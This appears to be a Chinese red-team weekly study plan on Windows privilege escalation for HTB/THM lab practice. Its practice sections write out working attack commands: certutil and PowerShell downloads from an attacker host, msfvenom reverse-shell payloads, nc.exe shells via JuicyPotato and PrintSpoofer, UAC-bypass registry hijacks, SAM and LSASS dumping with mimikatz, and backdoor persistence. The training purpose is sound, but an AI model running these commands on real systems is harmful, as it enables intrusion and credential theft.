@@ -1,0 +1,394 @@
+================================================================================
+第22周：Windows权限提升 (提权期)
+================================================================================
+
+【本周围绕的核心渗透案例阶段】
+引用红队队员完整学习手册中的案例：
+Windows环境下的渗透场景——攻击者通过钓鱼邮件或Web漏洞获得
+IIS APPPOOL\DefaultAppPool低权限用户Shell后，需要在Windows服务器上
+完成本地提权至NT AUTHORITY\SYSTEM，为后续域渗透和横向移动铺平道路。
+
+【本周学习目标】
+1. 掌握Windows系统信息收集的完整方法论（手动+自动化工具）
+2. 理解Windows服务权限配置错误导致的提权路径
+3. 掌握未引用路径（Unquoted Service Path）和服务二进制劫持技术
+4. 理解并利用Token窃取、Potato系列（Juicy/Rogue/PrintSpoofer）提权
+5. 掌握UAC绕过技术和Windows凭证提取方法（SAM/SYSTEM/LSA Secrets）
+6. 能够综合使用pspy和PEAS工具链完成Windows提权
+
+【本周知识清单】
+- Windows信息收集命令：whoami /all, systeminfo, net user, net localgroup
+- Windows服务权限体系：服务启动账户、服务ACL/DACL
+- 未引用服务路径(Unquoted Service Path)提权原理
+- 可写服务二进制替换原理
+- AlwaysInstallElevated注册表提权
+- Token与Impersonation：SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege
+- Potato系列漏洞：JuicyPotato、RoguePotato、PrintSpoofer、SweetPotato
+- UAC(User Account Control)工作原理与常见绕过方法
+- SAM文件结构与密码哈希提取：reg save, mimikatz
+- LSASS进程凭证dump技术
+- Scheduled Tasks计划任务提权
+- Windows内核漏洞(CVE)与内核版本对应关系
+- WinPEAS自动化信息收集工具
+- Seatbelt、PowerUp、Sherlock等提权辅助工具
+
+【本周工具清单】
+- winPEASx64.exe / winPEASx86.exe — Windows自动权限提升枚举
+- Seatbelt.exe — C#系统信息收集工具
+- PowerUp.ps1 — PowerShell提权辅助脚本
+- JuicyPotato.exe / RoguePotato.exe / PrintSpoofer.exe — Token提权
+- mimikatz.exe / Invoke-Mimikatz.ps1 — 凭证提取
+- accesschk.exe / accesschk64.exe — 权限检查工具（Sysinternals）
+- nc.exe / Invoke-PowerShellTcp.ps1 — 反弹Shell工具
+- winPEAS.bat — 批处理版信息收集（无exe上传受限时）
+- pspy64.exe — Windows进程监控工具
+- Sherlock.ps1 / Watson.exe — Windows内核漏洞检测
+- msfvenom — 生成Windows载荷
+- Windows Exploit Suggester — 内核漏洞建议
+
+================================================================================
+周一：Windows信息收集与枚举
+================================================================================
+
+📚 第1小时 | 理论学习 (09:00 - 10:00)
+  学习内容：Windows系统信息收集方法论
+    - 基础系统信息：whoami /all, systeminfo, hostname
+    - 用户与组信息：net user, net localgroup, net localgroup Administrators
+    - 网络信息：ipconfig /all, netstat -ano, route print, arp -a
+    - 进程与服务：tasklist /svc, sc query, wmic service list brief, Get-Process
+    - 文件系统与权限：icacls, cacls, Get-ChildItem
+    - 补丁与漏洞：wmic qfe list, systeminfo > 补丁列表
+    - 计划任务：schtasks /query /fo LIST /v
+    - 防火墙与安全：netsh firewall show state, Get-MpComputerStatus
+    - AlwaysInstallElevated注册表检查
+    - 自动化工具WinPEAS的输出结构解读
+  参考文件：/home/a/成长为一个红队/archstrike-privilege-escalation教学/02-Windows权限提升技术.txt
+
+💻 第2小时 | 动手实践 (10:00 - 11:00)
+  练习内容：手动信息收集+WinPEAS自动化枚举
+  参考文件：/home/a/成长为一个红队/archstrike-privilege-escalation教学/02-Windows权限提升技术.txt
+
+  操作步骤：
+    Step 1: 获得初始Shell后执行系统信息收集
+      whoami /all
+      systeminfo
+      net user
+      net localgroup Administrators
+      whoami /priv
+    Step 2: 上传winPEASx64.exe到目标
+      攻击机启动HTTP服务: python3 -m http.server 80
+      目标使用certutil/powershell下载:
+        certutil -urlcache -f http://192.168.1.100/winPEASx64.exe C:\Windows\Tasks\p.exe
+        C:\Windows\Tasks\p.exe | Out-File C:\Windows\Tasks\peas_output.txt
+    Step 3: 分析WinPEAS输出
+      重点查看红色/橙色标记的高危项
+      关注: SeImpersonatePrivilege, AlwaysInstallElevated, Unquoted Service Paths
+      关注: 可写服务路径、可写注册表、存储的凭据
+    Step 4: 检查补丁漏洞
+      systeminfo > info.txt
+      使用Windows Exploit Suggester匹配补丁与CVE
+      或上传Sherlock.ps1: IEX(New-Object Net.WebClient).DownloadString('http://IP/Sherlock.ps1'); Find-AllVulns
+    Step 5: 查看是否有存储的凭据
+      cmdkey /list
+      dir C:\Users\用户名\AppData\Local\Microsoft\Credentials\
+    Step 6: 整理信息收集结果，按提权路径的利用难度和成功概率排序
+
+📝 第3小时 | 复盘总结 (11:00 - 12:00)
+  - 今日收获：掌握Windows信息收集的系统化流程，理解WinPEAS输出
+  - 遇到问题：____________________
+  - 明日计划：深入学习服务权限与计划任务提权技术
+
+================================================================================
+周二：服务权限与计划任务提权
+================================================================================
+
+📚 第1小时 | 理论学习 (09:00 - 10:00)
+  学习内容：Windows服务权限与计划任务提权原理
+    - Windows服务架构：服务控制管理器(SCM)、服务二进制文件、服务账户
+    - 服务权限类型：SERVICE_ALL_ACCESS, SERVICE_CHANGE_CONFIG, SERVICE_START, SERVICE_STOP
+    - Unquoted Service Path提权原理
+      - 路径如C:\Program Files\Unquoted Path\service.exe
+      - 系统会依次尝试执行C:\Program.exe, C:\Program Files\Unquoted.exe
+    - 可写服务二进制文件替换原理
+      - 当前用户对服务的二进制文件路径有写权限
+      - 替换为恶意exe并重启服务
+    - 服务注册表修改：HKLM\SYSTEM\CurrentControlSet\Services\
+    - 计划任务(Scheduled Tasks)提权
+      - schtasks命令检查可写脚本/程序引用的任务
+      - 任务触发条件与权限上下文
+    - AlwaysInstallElevated注册表策略
+      - HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
+      - HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
+  参考文件：/home/a/成长为一个红队/archstrike-privilege-escalation教学/02-Windows权限提升技术.txt
+
+💻 第2小时 | 动手实践 (10:00 - 11:00)
+  练习内容：服务权限利用和计划任务提权
+  参考文件：/home/a/成长为一个红队/archstrike-privilege-escalation教学/02-Windows权限提升技术.txt
+
+  操作步骤：
+    Step 1: 枚举Unquoted Service Path
+      wmic service get name,displayname,pathname,startmode | findstr /i "Auto"
+      wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows"
+      或使用: Get-WmiObject win32_service | ?{$_.StartMode -eq "Auto"} | select Name,PathName
+    Step 2: 检查服务的ACL权限
+      accesschk64.exe -uwcqv "当前用户" *
+      accesschk64.exe -ucqv <服务名>
+      确认有SERVICE_CHANGE_CONFIG权限
+    Step 3: 利用Unquoted Service Path提权
+      选择一个有写权限的目录（如C:\Program Files\）
+      生成恶意exe: msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o Program.exe
+      上传到C:\Program Files\Program.exe
+      重启服务: net stop <服务名> && net start <服务名>
+    Step 4: 检查AlwaysInstallElevated
+      注册表查询:
+        reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+        reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+      若均为1:
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4445 -f msi -o malicious.msi
+        msiexec /quiet /qn /i malicious.msi
+    Step 5: 检查计划任务
+      schtasks /query /fo LIST /v | findstr /i "Task To Run:"
+      寻找可写脚本路径或可篡改的程序引用
+      icacls <任务程序路径> 检查写权限
+    Step 6: 计划任务劫持利用
+      若发现可写脚本: echo "net localgroup Administrators 用户 /add" >> script.bat
+      若任务触发频率快，等待任务执行后验证权限
+
+📝 第3小时 | 复盘总结 (11:00 - 12:00)
+  - 今日收获：理解Windows服务权限体系，掌握Unquoted Service Path利用
+  - 遇到问题：____________________
+  - 明日计划：学习Token窃取与Potato系列提权技术
+
+================================================================================
+周三：Token窃取与Potato系列
+================================================================================
+
+📚 第1小时 | 理论学习 (09:00 - 10:00)
+  学习内容：Token窃取与Potato系列提权原理
+    - Windows Token机制概述：主Token、模拟Token
+    - SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege 权限含义
+    - 哪些账户默认拥有这些特权：IIS APPPOOL, Network Service, Local Service
+    - JuicyPotato原理：利用COM服务器+BITS服务的Token模拟
+      - CLSID (Class ID)的概念与选择
+      - 本地COM服务器爆破发现可用的CLSID
+    - RoguePotato原理：利用Rogue OXID Resolver伪造对象引用
+    - PrintSpoofer原理：利用Print System Remote Protocol (MS-RPRN)
+      - 打印假脱机程序的命名管道模拟
+    - SweetPotato原理：多方法融合的Token攻击集合
+    - PipePotato/EfsPotato 等其他变种
+    - CLSID选择策略：针对不同OS版本选取合适的CLSID
+  参考文件：/home/a/成长为一个红队/archstrike-privilege-escalation教学/02-Windows权限提升技术.txt
+
+💻 第2小时 | 动手实践 (10:00 - 11:00)
+  练习内容：Token窃取与Potato系列工具的编译和使用
+  参考文件：/home/a/成长为一个红队/archstrike-privilege-escalation教学/02-Windows权限提升技术.txt
+
+  操作步骤：
+    Step 1: 确认当前用户拥有SeImpersonatePrivilege
+      whoami /priv
+      确认列表中有SeImpersonatePrivilege (Enabled/Disabled均可)
+    Step 2: 下载JuicyPotato并准备利用
+      从GitHub下载JuicyPotato.exe预编译版本
+      确认目标OS版本（Windows Server 2016/2019/2022）和CLSID选择
+    Step 3: JuicyPotato提权实战
+      上传nc.exe: certutil -urlcache -f http://IP/nc.exe C:\Windows\Tasks\nc.exe
+      上传JuicyPotato.exe:
+        certutil -urlcache -f http://IP/JuicyPotato.exe C:\Windows\Tasks\jp.exe
+      执行: C:\Windows\Tasks\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Tasks\nc.exe IP 4444 -e cmd.exe" -t * -c {CLSID}
+      攻击机监听: nc -lvnp 4444
+    Step 4: PrintSpoofer提权实战
+      上传PrintSpoofer64.exe:
+        certutil -urlcache -f http://IP/PrintSpoofer64.exe C:\Windows\Tasks\ps.exe
+      执行: C:\Windows\Tasks\ps.exe -c "C:\Windows\Tasks\nc.exe IP 5555 -e cmd.exe"
+      攻击机监听: nc -lvnp 5555
+      确认新Shell的whoami为nt authority\system
+    Step 5: RoguePotato提权实战
+      上传RoguePotato.exe和socat到攻击机模拟OXID Resolver
+      攻击机: socat TCP-LISTEN:135,reuseaddr,fork TCP:目标IP:9999
+      上传RoguePotato.exe到目标并执行
+    Step 6: 记录不同Potato工具在目标OS上的成功/失败情况
+      建立兼容性速查表：Win版本 → 可用Potato工具
+
+📝 第3小时 | 复盘总结 (11:00 - 12:00)
+  - 今日收获：理解Token模拟机制，掌握JuicyPotato/PrintSpoofer使用
+  - 遇到问题：____________________
+  - 明日计划：学习UAC绕过与Windows凭证提取技术
+
+================================================================================
+周四：UAC绕过与凭证提取
+================================================================================
+
+📚 第1小时 | 理论学习 (09:00 - 10:00)
+  学习内容：UAC绕过和凭证提取原理
+    - UAC(User Account Control)体系结构
+      - 完整性级别(Integrity Level): Low/Medium/High/System
+      - UAC提权提示(Prompt)触发条件
+      - Admin Approval Mode (AAM)
+    - 常见UAC绕过技术：
+      - DLL劫持绕过（利用信任的AutoElevate程序）
+      - 注册表键劫持（HKCR\mscfile\shell绕过）
+      - FodHelper.exe绕过（适用于Win10）
+      - ComputerDefaults.exe绕过
+      - Eventvwr.exe注册表劫持
+    - 凭证提取技术：
+      - SAM文件结构：LM Hash/NTLM Hash
+      - reg save HKLM\SAM / reg save HKLM\SYSTEM 离线提取
+      - LSA Secrets提取: reg save HKLM\SECURITY
+      - LSASS进程内存DUMP: procdump, Task Manager, comsvcs.dll
+      - mimikatz凭证提取：sekurlsa::logonpasswords, lsadump::sam
+      - DPAPI解密与浏览器/应用程序凭证
+      - Kerberos Tickets提取 (TGT/TGS)
+  参考文件：/home/a/成长为一个红队/archstrike-privilege-escalation教学/02-Windows权限提升技术.txt
+
+💻 第2小时 | 动手实践 (10:00 - 11:00)
+  练习内容：UAC绕过和凭证提取实战
+  参考文件：/home/a/成长为一个红队/archstrike-privilege-escalation教学/02-Windows权限提升技术.txt
+
+  操作步骤：
+    Step 1: 确认当前完整性级别
+      whoami /groups | findstr /i "Mandatory"
+      如果显示Medium Mandatory Level，尝试UAC绕过提升到High
+    Step 2: 尝试FodHelper.exe UAC绕过
+      方法: 注册表劫持+创建特殊目录
+      reg add "HKCU\Software\Classes\ms-settings\Shell\open\command" /d "cmd.exe" /f
+      reg add "HKCU\Software\Classes\ms-settings\Shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f
+      fodhelper.exe
+    Step 3: 尝试ComputerDefaults.exe UAC绕过
+      reg add "HKCU\Software\Classes\ms-settings\Shell\open\command" /d "C:\Windows\Tasks\nc.exe IP 6666 -e cmd.exe" /f
+      reg add "HKCU\Software\Classes\ms-settings\Shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f
+      ComputerDefaults.exe
+      攻击机监听: nc -lvnp 6666
+    Step 4: SAM+SYSTEM离线凭证提取
+      reg save HKLM\SAM C:\Windows\Tasks\sam.save
+      reg save HKLM\SYSTEM C:\Windows\Tasks\system.save
+      下载到攻击机: impacket-secretsdump -sam sam.save -system system.save LOCAL
+      获取所有用户的NTLM Hash
+    Step 5: LSASS内存Dump凭证提取
+      上传procdump64.exe（或使用系统自带comsvcs.dll）
+      procdump64.exe -accepteula -ma lsass.exe C:\Windows\Tasks\lsass.dmp
+      下载lsass.dmp到攻击机
+      用mimikatz加载: sekurlsa::minidump lsass.dmp; sekurlsa::logonpasswords
+    Step 6: mimikatz在线凭证提取
+      上传mimikatz.exe
+      执行: privilege::debug
+            token::elevate
+            sekurlsa::logonpasswords
+            lsadump::sam
+      记录所有提取到的用户和哈希
+
+📝 第3小时 | 复盘总结 (11:00 - 12:00)
+  - 今日收获：掌握FodHelper/UAC绕过和SAM/LSASS凭证提取技术
+  - 遇到问题：____________________
+  - 明日计划：综合使用pspy+PEAS工具链进行提权实战
+
+================================================================================
+周五：提权综合工具链 (pspy + PEAS组合)
+================================================================================
+
+📚 第1小时 | 理论学习 (09:00 - 10:00)
+  学习内容：Windows提权综合工具链方法论
+    - pspy64.exe进程监控在Windows环境中的应用
+    - WinPEAS + Seatbelt + PowerUp 工具链互补分析
+      每种工具的优势和盲区
+    - 标准化Windows提权checklist：
+      whoami/all → systeminfo → WinPEAS → pspy64 → 按优先级利用
+    - 实战中常见限制：
+      - 防火墙/AV/EDR拦截exe上传
+      - 受限PowerShell执行策略绕过
+      - AppLocker/Device Guard绕过基础
+      - AMSI绕过基础思路
+    - Windows下WebShell到提权的完整链：aspx/cmd webshell → 上传工具 → 提权
+    - 提权后信息收集（域信息、凭据缓存、网络拓扑）
+  参考文件：/home/a/成长为一个红队/archstrike-privilege-escalation教学/03-提权综合工具链实战.txt
+
+💻 第2小时 | 动手实践 (10:00 - 11:00)
+  练习内容：Windows完整提权链实战演练
+  参考文件：/home/a/成长为一个红队/archstrike-privilege-escalation教学/03-提权综合工具链实战.txt
+
+  操作步骤：
+    Step 1: 环境搭建，获得低权限Shell
+      在HTB Windows靶机或本地Windows VM中获得一个低权限Shell
+      确认: whoami /all 记录当前用户和权限
+    Step 2: WinPEAS全面枚举
+      上传winPEASx64.exe并执行
+      将输出保存: winPEASx64.exe > C:\Windows\Tasks\peas.txt
+      标记所有高危发现: [X] 标记有利用价值的项目
+    Step 3: pspy64进程监控
+      上传pspy64.exe并执行
+      后台运行: start /b pspy64.exe > C:\Windows\Tasks\pspy.txt
+      等待几分钟观察周期性进程（计划任务、服务重启）
+      关注以SYSTEM权限运行的短时进程
+    Step 4: 对比分析工具输出
+      将WinPEAS发现的高危项与pspy64观察到的进程交叉验证
+      确定最优提权路径
+    Step 5: 执行选定的提权路径
+      根据优先级执行提权：
+        1) SeImpersonate → PrintSpoofer/JuicyPotato
+        2) Service Misconfig → Unquoted Path/可写服务
+        3) Token → Potato系列
+        4) 内核漏洞 → 编译利用代码
+    Step 6: 提权成功后的后渗透操作
+      whoami (确认NT AUTHORITY\SYSTEM)
+      收集域信息: net group "Domain Admins" /domain, nltest /dclist:域名
+      转储凭据: 参考周四的凭证提取方法
+      获取持久化: 创建管理员账户、安装后门服务
+
+📝 第3小时 | 复盘总结 (11:00 - 12:00)
+  - 今日收获：建立Windows提权标准化流程，掌握pspy+PEAS组合使用
+  - 遇到问题：____________________
+  - 明日计划：复习本周所有内容，在HTB上挑战Windows Easy靶机
+
+================================================================================
+周六：复习日 (2h 复习 + 1h HTB/THM)
+================================================================================
+
+📚 复习内容（2小时）
+  1. 重新整理Windows提权checklist，制作流程图
+  2. 对比Linux提权(上周)和Windows提权(本周)的异同点
+  3. 整理Potato系列工具版本兼容性矩阵（OS版本→工具选择）
+  4. 复习所有手动信息收集命令，练习在不依赖工具的情况下的信息收集
+  5. 制作Windows凭证提取速查表（SAM离线/LSASS Dump/mimikatz在线）
+
+💻 HTB/THM练习（1小时）
+  - 登录HackTheBox平台
+  - 选择一台Easy/Medium难度Windows机器（推荐：Legacy, Blue, Devel, Optimum）
+  - 目标：40分钟内完成从初始Shell到SYSTEM的完整提权
+  - 输出：撰写提权过程的简要笔记
+
+📝 复习笔记
+  - 本周最有效的技术：____________________
+  - 需要加强的部分：____________________
+  - 下周预习计划：代理与隧道技术（proxychains, chisel, SSH端口转发）
+
+================================================================================
+周日：休息日
+================================================================================
+
+【本周资源清单】
+理论知识文件：
+  /home/a/成长为一个红队/archstrike-privilege-escalation教学/02-Windows权限提升技术.txt
+  /home/a/成长为一个红队/archstrike-privilege-escalation教学/03-提权综合工具链实战.txt
+  /home/a/成长为一个红队/网安基础知识/XX-Windows权限模型.txt
+
+实践教程文件：
+  /home/a/成长为一个红队/archstrike-privilege-escalation教学/02-Windows权限提升技术.txt
+  /home/a/成长为一个红队/archstrike-privilege-escalation教学/03-提权综合工具链实战.txt
+
+在线练习：
+  HackTheBox: Legacy, Blue, Devel, Optimum, Bastion, Remote (Windows)
+  TryHackMe: Windows Privesc, Windows Privesc Arena, Blue
+  VulnHub: 搜索Windows靶机
+
+工具下载：
+  winPEAS: https://github.com/carlospolop/PEASS-ng
+  PrintSpoofer: https://github.com/itm4n/PrintSpoofer
+  JuicyPotato: https://github.com/ohpe/juicy-potato
+  SweetPotato: https://github.com/CCob/SweetPotato
+  mimikatz: https://github.com/gentilkiwi/mimikatz
+  Seatbelt: https://github.com/GhostPack/Seatbelt
+  PowerUp: https://github.com/PowerShellMafia/PowerSploit
+  pspy64: https://github.com/DominicBreuker/pspy
+
+【本周完成检查】
+[ ] 周一 [ ] 周二 [ ] 周三 [ ] 周四 [ ] 周五
+[ ] 周六复习 [ ] 笔记 [ ] 体能
